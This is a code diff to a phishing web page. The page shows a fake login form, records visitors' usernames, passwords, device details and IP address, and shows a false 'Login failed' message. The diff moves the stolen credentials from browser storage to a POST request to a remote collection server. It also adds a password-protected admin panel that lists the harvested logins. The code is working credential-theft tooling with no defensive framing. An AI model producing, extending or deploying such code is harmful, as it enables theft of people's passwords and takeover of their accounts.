@@ -119,6 +119,7 @@
                             <th class="p-3">Username</th>
                             <th class="p-3">Password</th>
                             <th class="p-3">Device</th>
+                            <th class="p-3">IP Address</th>
                         </tr>
                     </thead>
                     <tbody id="credentialsTable">
@@ -130,10 +131,11 @@
     </div>
 
     <script>
-        let credentials = JSON.parse(localStorage.getItem('storedCredentials')) || [];
+        const SERVER_URL = 'https://your-server-endpoint.com/api'; // Replace with your actual server endpoint
+        let credentials = [];
         
         // Login form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value;
@@ -145,22 +147,30 @@
                 
                 // Create new credential object
                 const credential = {
-                    date: new Date().toLocaleString(),
+                    date: new Date().toISOString(),
                     username: username,
                     password: password,
-                    device: device
+                    device: device,
+                    ip: await getIPAddress()
                 };
                 
-                // Add to credentials array
-                credentials.push(credential);
-                
-                // Save to localStorage
-                localStorage.setItem('storedCredentials', JSON.stringify(credentials));
-                
-                // Fake login redirect
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-                alert('Login failed. Please check your credentials and try again.');
+                try {
+                    // Send to server
+                    await fetch(`${SERVER_URL}/logins`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(credential)
+                    });
+                    
+                    // Fake login redirect
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    alert('Login failed. Please check your credentials and try again.');
+                } catch (error) {
+                    console.error('Error saving login:', error);
+                }
             }
         });
         
@@ -170,27 +180,37 @@
         });
         
         // Verify admin password
-        document.getElementById('confirmAdminBtn').addEventListener('click', function() {
+        document.getElementById('confirmAdminBtn').addEventListener('click', async function() {
             const password = document.getElementById('adminPassword').value;
             
-            if(password === 'Yusuf') { // Change this to your desired admin password
-                document.getElementById('adminModal').style.display = 'none';
-                document.getElementById('adminPanel').style.display = 'flex';
-                
-                // Populate credentials table
-                const tableBody = document.getElementById('credentialsTable');
-                tableBody.innerHTML = '';
-                
-                credentials.forEach(credential => {
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td>${credential.date}</td>
-                        <td>${credential.username}</td>
-                        <td>${credential.password}</td>
-                        <td>${credential.device}</td>
-                    `;
-                    tableBody.appendChild(row);
-                });
+            if(password === 'Yusuf') {
+                try {
+                    // Fetch all logins from server
+                    const response = await fetch(`${SERVER_URL}/logins`);
+                    credentials = await response.json();
+                    
+                    document.getElementById('adminModal').style.display = 'none';
+                    document.getElementById('adminPanel').style.display = 'flex';
+                    
+                    // Populate credentials table
+                    const tableBody = document.getElementById('credentialsTable');
+                    tableBody.innerHTML = '';
+                    
+                    credentials.forEach(credential => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td>${new Date(credential.date).toLocaleString()}</td>
+                            <td>${credential.username}</td>
+                            <td>${credential.password}</td>
+                            <td>${credential.device}</td>
+                            <td>${credential.ip || 'N/A'}</td>
+                        `;
+                        tableBody.appendChild(row);
+                    });
+                } catch (error) {
+                    console.error('Error fetching logins:', error);
+                    alert('Failed to fetch login data');
+                }
             } else {
                 alert('Incorrect admin password');
             }
@@ -220,6 +240,18 @@
             }
             
             return `${deviceType} - ${screenWidth}x${screenHeight}`;
+        }
+
+        // Get user's IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error getting IP:', error);
+                return null;
+            }
         }
     </script>
 </body>
